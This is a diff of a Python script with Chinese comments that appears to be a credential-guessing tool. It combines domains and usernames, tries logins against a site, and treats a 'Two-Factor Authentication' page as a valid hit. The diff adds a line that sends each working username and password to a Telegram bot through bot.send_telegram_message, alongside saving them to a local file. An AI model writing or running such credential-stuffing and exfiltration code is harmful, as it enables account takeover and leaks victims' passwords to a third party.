@@ -5,7 +5,7 @@ import re
 from concurrent.futures import ThreadPoolExecutor
 
 from bs4 import BeautifulSoup
-
+import bot
 
 class Euorg:
     def __init__(self):
@@ -91,7 +91,6 @@ def mixUserInfo(domain, user):
             time.sleep(5)
 
 
-
 # 登录
 def login(user, pwd):
     print(f'login: {user}, {pwd}')
@@ -138,8 +137,10 @@ def login(user, pwd):
     # 检查登录结果
     if response.status_code == 200 and 'Two-Factor Authentication' in response.text:  # 根据实际成功页面调整判断条件
         print(f"登录成功！username: {username}, password: {password}")
+        bot.send_telegram_message(f"登录成功！username: {username}, password: {password}")
+
         # 打印登录后的cookies
-        print("Session Cookie:", session.cookies.get('sessionid'))
+        # print("Session Cookie:", session.cookies.get('sessionid'))
         write_regist('./login.txt', username + '\t' + password)
     else:
         print("登录失败，状态码:", response.status_code)
@@ -153,3 +154,4 @@ if __name__ == '__main__':
     now_time = time.time()
     print(f'\n>>> 运行结束，共耗时 {now_time - start_time:.2f} 秒。所得运行结果，在当前所在目录下，请查收。\n')
     input('>>> 按任意键退出……')
+
